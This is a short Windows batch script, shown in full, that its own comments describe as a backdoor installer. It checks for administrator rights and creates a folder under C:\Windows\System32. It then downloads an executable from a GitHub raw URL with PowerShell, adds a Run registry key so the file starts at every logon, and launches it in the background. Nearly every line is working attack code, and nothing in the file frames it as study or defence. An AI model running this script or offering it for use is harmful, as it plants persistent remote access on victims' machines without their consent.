@echo off

:: Check for Administrator privileges
openfiles >nul 2>&1
if %errorlevel% neq 0 (
    echo This program must be run as administrator.
    exit /b 1
)

:: Create directory for backdoor executable
mkdir C:\Windows\System32\JAANSEC

:: Download the backdoor executable
powershell -Command "Invoke-WebRequest -Uri https://github.com/NEJANX/cdn/raw/main/jaansec-bdserver/bdserver_windows.exe -OutFile C:\Windows\System32\JAANSEC\bdserver.exe"

:: Create a registry entry for startup
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v bdserver /t REG_SZ /d "C:\Windows\System32\JAANSEC\bdserver.exe" /f

:: Run the backdoor executable as a background process
start /b C:\Windows\System32\JAANSEC\bdserver.exe

exit /b 0
